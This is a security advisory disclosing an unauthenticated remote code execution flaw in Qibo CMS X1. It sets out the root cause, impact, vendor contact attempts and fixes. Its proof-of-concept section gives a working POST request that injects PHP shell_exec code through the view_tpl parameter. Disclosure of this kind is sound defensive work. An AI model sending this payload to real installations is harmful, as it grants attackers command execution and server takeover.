# Security Advisory: Unauthenticated Remote Code Execution (RCE) in Qibo CMS X1

- **Advisory ID:** SEC-2026-QIBO-X1-01
- **Discovery Date:** October 19, 2026
- **Severity:** Critical (CVSS v3.1 Score: 9.8 / 10.0)
- **Vulnerability Type:** Remote Code Execution (RCE) / Improper Control of Generation of Code (`CWE-94`)
- **Affected Product:** Qibo CMS X1 (`qibosoft X1.0`)
- **Tested Build:** Gitee Repository (`https://gitee.com/qibosoft/x1_of_cms.git`), Commit `ff5719d0`

---

## 1. Executive Summary

A critical remote code execution (RCE) vulnerability has been identified in Qibo CMS X1 (`qibosoft X1.0`) at the endpoint `index.php?s=index/label_show/ajax_get`. The endpoint fails to enforce authentication checks and insecurely evaluates user-supplied template and class parameters. Consequently, an unauthenticated remote attacker can execute arbitrary operating-system commands under the privileges of the underlying web server user (`www-data`), potentially leading to total system compromise.

---

## 2. Technical Details & Vulnerability Vector

### 2.1 Vulnerable Endpoint
- **URL Path:** `/index.php?s=index/label_show/ajax_get`
- **HTTP Method:** `POST`
- **Authentication:** None required (Unauthenticated)

### 2.2 Root Cause Analysis
The controller handling `label_show/ajax_get` accepts dynamic class bindings and template inputs from HTTP request parameters without sanitization or access control. Specifically:
1. The parameter `class=app\common\model\User@labelGet` dynamically invokes application model methods.
2. The parameter `view_tpl` accepts arbitrary raw template code.
3. Because the application passes this input directly to its internal template evaluation engine as PHP code, an attacker can supply embedded PHP system commands that execute immediately upon rendering.

---

## 3. Proof of Concept (PoC)

*Disclaimer: This information is provided for educational, defensive audit, and vulnerability verification purposes only.*

### Request Structure
An attacker can trigger code execution by submitting a crafted HTTP POST request to the target application instance:

```http
POST /index.php?s=index/label_show/ajax_get&tagname=test&pagename=test HTTP/1.1
Host: target-server.local
Content-Type: application/x-www-form-urlencoded

union=class&class=app\common\model\User@labelGet&rows=1&page=1&view_tpl=<?php echo shell_exec('whoami'); ?>
```

### Expected Response
The application evaluates the payload and returns the execution output directly within the JSON response structure:

```json
{
  "code": 1,
  "msg": "success",
  "data": "www-data\n"
}
```

---

## 4. Impact Assessment

- **System Access:** Complete remote code execution under the web server process context (`www-data` or equivalent).
- **Data Confidentiality & Integrity:** Potential unauthorized reading of sensitive application configuration files (including database credentials) and file system manipulation.
- **Lateral Movement:** Pivot point into the host network or internal infrastructure if the host environment is misconfigured.

---

## 5. Vendor Coordination & Disclosure Status

- **Vendor:** QiboSoft / Guangzhou Qibo Network Technology Co., Ltd. (`php168.com`)
- **Notification Attempt:** Direct notification attempts sent via official support channels (`kefu@qibosoft.net`) failed due to mail server routing rejections (SMTP connection refused).
- **Third-Party Coordination:** Reported to national vulnerability coordination centers (CNCERT/CNVD) and submitted to security tracking platforms (VulDB) for public tracking and CVE assignment.

---

## 6. Remediation & Recommendations

1. **Immediate Patching / Workaround:** 
   - Disable or restrict public access to the `label_show/ajax_get` controller route if it is not required for production usage.
   - Enforce strict authentication and authorization checks on all AJAX and label-rendering endpoints.
2. **Code-Level Fix:**
   - Remove support for user-controlled template evaluation (`eval` or raw string interpretation of template files).
   - Implement strict allowlists for dynamic class and method invocations rather than parsing class references directly from request parameters.
3. **Upstream Upgrade:** Apply official patches released by QiboSoft once a security advisory is published.